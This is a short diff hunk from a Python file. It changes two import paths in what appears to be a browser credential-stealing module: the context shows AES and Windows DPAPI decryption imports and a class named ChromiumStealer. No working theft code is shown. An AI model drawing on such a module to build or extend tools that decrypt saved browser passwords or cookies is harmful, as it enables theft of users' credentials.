@@ -38,8 +38,8 @@ from datetime import datetime
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
-from config.constants import Constant
-from config.manager import ModuleManager
+from config import Constant
+from config import ModuleManager
 
 
 class ChromiumStealer(ModuleManager):
